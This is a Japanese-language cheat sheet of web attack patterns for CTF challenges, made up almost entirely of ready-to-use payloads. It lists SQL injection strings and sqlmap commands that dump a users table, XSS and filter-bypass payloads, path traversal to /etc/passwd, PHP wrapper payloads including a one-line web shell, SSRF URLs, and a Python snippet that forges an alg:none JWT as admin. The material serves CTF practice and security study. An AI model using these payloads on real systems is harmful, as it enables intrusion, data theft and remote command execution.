# Web CTF パターン集

## SQLインジェクション

### 検出
```
' OR '1'='1
' OR 1=1--
" OR ""="
admin'--
```

### Union-based
```sql
' UNION SELECT 1,2,3--
' UNION SELECT null,table_name,null FROM information_schema.tables--
' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--
```

### Blind SQLi
```sql
' AND 1=1--  (true)
' AND 1=2--  (false)
' AND SUBSTRING(database(),1,1)='a'--
```

### sqlmap
```bash
sqlmap -u "http://target/page?id=1" --batch --dbs
sqlmap -u "http://target/page?id=1" --batch -D dbname --tables
sqlmap -u "http://target/page?id=1" --batch -D dbname -T users --dump
```

## XSS

### 基本
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### フィルターバイパス
```html
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="alert(1)">
<body onload=alert(1)>
```

## LFI/RFI

### 基本
```
../../etc/passwd
....//....//etc/passwd
/etc/passwd%00
```

### PHPラッパー
```
php://filter/convert.base64-encode/resource=index.php
php://input
data://text/plain,<?php system($_GET['cmd']); ?>
```

## SSRF

```
http://localhost/admin
http://127.0.0.1/admin
http://[::1]/admin
http://0.0.0.0/admin
file:///etc/passwd
```

## JWT

### 検証
```bash
# ヘッダー/ペイロードをBase64デコード
echo "eyJ..." | base64 -d
```

### alg:none攻撃
```python
import base64
header = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
payload = base64.b64encode(b'{"user":"admin"}').decode().rstrip('=')
token = f"{header}.{payload}."
```
